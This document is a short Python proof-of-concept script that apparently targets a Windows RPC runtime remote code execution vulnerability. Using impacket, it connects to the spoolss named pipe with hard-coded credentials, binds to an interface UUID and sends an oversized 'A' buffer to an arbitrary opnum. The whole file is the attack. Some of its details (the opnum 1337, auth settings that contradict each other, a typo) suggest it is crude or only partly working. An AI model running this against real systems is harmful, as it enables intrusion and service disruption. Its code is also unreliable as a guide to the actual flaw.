'''
Remote Procedure Call Runtime Remote Code Execution Vulnerability
'''
from impacket.dcerpc.v5.rpcrt import *
from impacket import uuid
from impacket.dcerpc.v5 import transport

binding = "ncacn_np:%(host)s[\\pipe\\%(pipe)s]"
binding %= {'host':'127.0.0.1','pipe': 'spoolss', 'port': 445}

print("Using binding: %r "%binding)

trans = transport.DCERPCTransportFactory(binding)
trans.set_dport(445)
trans.set_credentials('Admin','1234')
trans.connect()

dce = trans.DCERPC_class(trans)
dce.set_auth_level(RPC_C_AUTHN_LEVEL_NONE)
dce.set_max_tfrag(1024)
dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)

print("concted to SMB")

dce.bind(uuid.uuidtup_to_bin(('0b6edbfa-4a24-4fc6-8a23-942b1eca65d1','1.0')))

dce.call(1337, "A" * 1000)

print(dce.recv())
print(dce.disconnect())